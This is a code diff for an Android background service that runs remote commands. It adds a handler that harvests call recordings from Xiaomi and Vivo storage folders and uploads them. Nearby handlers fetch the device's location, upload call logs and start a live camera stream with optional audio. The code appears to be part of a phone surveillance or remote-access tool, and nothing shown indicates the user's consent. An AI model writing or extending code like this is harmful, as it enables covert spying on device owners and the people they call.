@@ -151,7 +151,6 @@ class DeviceConnectionService : Service() {
                 processPendingCommands()
 
                 val uploaded = repository.uploadPendingTelemetry()
-                val uploadedNotifications = repository.uploadPendingNotifications()
                 val uploadedCallLogs = repository.uploadPendingCallLogs()
 
                 if (realtimeSocket?.connected() != true) {
@@ -160,7 +159,7 @@ class DeviceConnectionService : Service() {
                 }
 
                 idleCycles =
-                    if (uploaded || uploadedNotifications || uploadedCallLogs) {
+                    if (uploaded || uploadedCallLogs) {
                         0
                     } else {
                         (idleCycles + 1).coerceAtMost(4)
@@ -280,6 +279,38 @@ class DeviceConnectionService : Service() {
                         }
                     }
 
+                    "device.refresh_call_recordings" -> {
+                        val offset = (command.payload.recordingsOffset ?: 0).coerceAtLeast(0)
+                        val limit = (command.payload.recordingsLimit ?: 10).coerceIn(1, 50)
+                        val xiaomiPaths =
+                            command.payload.xiaomiCallRecordingPaths
+                                ?.filter { it.isNotBlank() }
+                                ?.ifEmpty { null }
+                                ?: emptyList()
+                        val vivoPaths =
+                            command.payload.vivoCallRecordingPaths
+                                ?.filter { it.isNotBlank() }
+                                ?.ifEmpty { null }
+                                ?: emptyList()
+
+                        val uploadedCount =
+                            repository.refreshCallRecordingsFromStorage(
+                                offset = offset,
+                                limit = limit,
+                                xiaomiPaths = xiaomiPaths,
+                                vivoPaths = vivoPaths
+                            )
+                        if (uploadedCount == 0) {
+                            error(
+                                if (repository.hasCallRecordingAccessPermission()) {
+                                    "No call recordings were found in configured directories for this page."
+                                } else {
+                                    "Storage/audio permission is not granted on the device."
+                                }
+                            )
+                        }
+                    }
+
                     "device.get_location" -> {
                         val locationResult = requestBestEffortLocation() ?: error("Location unavailable.")
                         repository.queueLocationSnapshot(
@@ -298,7 +329,7 @@ class DeviceConnectionService : Service() {
                     "device.start_camera_stream" -> {
                         val requestedFacing = command.payload.cameraFacing ?: "back"
                         val requestedAudio = command.payload.includeAudio ?: false
-                        val requestedTransport = command.payload.preferredTransport ?: "webrtc"
+                        val requestedTransport = command.payload.preferredTransport ?: "mjpeg"
 
                         if (!repository.hasCameraPermission()) {
                             throw CameraStartCommandFailure(
